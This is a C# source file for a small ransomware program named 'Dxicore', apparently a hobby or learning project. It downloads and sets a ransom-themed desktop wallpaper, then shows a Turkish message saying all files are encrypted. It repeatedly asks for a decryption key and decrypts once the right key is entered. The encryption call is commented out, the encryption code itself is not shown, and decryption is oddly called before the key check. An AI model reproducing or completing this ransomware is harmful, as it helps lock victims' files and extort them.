using Dxicore.Encypt;
using Dxicore.Wallpaper;
using Spectre.Console;

string key = EncryptionProcess.key;
string userDocument = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

EncryptionProcess EncryptionStart = new EncryptionProcess();
/*EncryptionStart.startAction();
*/


//      Change Wallpaper        //
string ransomwareWallpaperUrl = "https://images.wallpapersden.com/image/download/kyojuro-rengoku-demon-slayer_a21oaWmUmZqaraWkpJRnamtlrWZpaWU.jpg";
string wallpaperPath = Path.Combine(userDocument, "wallpaper.jpg");

await WallpaperProcess.DownloadWallpaper(ransomwareWallpaperUrl, wallpaperPath);
WallpaperProcess.SetWallpaper(wallpaperPath);


AnsiConsole.Write(
    new FigletText("Dxicore")
        .Centered()
        .Color(Spectre.Console.Color.Red));

var info = new Rule("[red rapidblink]Tüm dosyalarınız şifrelendi![/]");
info.Style = Style.Parse("red bold");
info.Centered();
AnsiConsole.WriteLine();
AnsiConsole.Write(info);
AnsiConsole.WriteLine();
EncryptionStart.DecryptDirectory();

var keyAsk = AnsiConsole.Ask<string>("[conceal]tab[/][lime invert] Anahtarı girin: [/]");

while (keyAsk != key)
{
    AnsiConsole.WriteLine();
    var errorKey = new Rule("[red]Girdiğiniz Şifre Hatalı[/]");
    errorKey.RuleStyle("red dim");
    errorKey.LeftJustified();
    AnsiConsole.Write(errorKey);
    AnsiConsole.WriteLine();
    keyAsk = AnsiConsole.Ask<string>("[conceal]tab[/][lime invert] Anahtarı girin: [/]");
}

if (keyAsk == key)
{
    AnsiConsole.Clear();
    AnsiConsole.Write(
    new FigletText("Dxicore")
        .Centered()
        .Color(Spectre.Console.Color.Red));
    EncryptionStart.DecryptDirectory();
    var succes = new Rule("[lime rapidblink]Tebrikler, bilgisayarınızı geri getirmeyi başardınız![/]");
    succes.Style = Style.Parse("lime bold");
    succes.Centered();
    AnsiConsole.WriteLine();
    AnsiConsole.Write(succes);
    AnsiConsole.WriteLine();
    Console.ReadLine();
}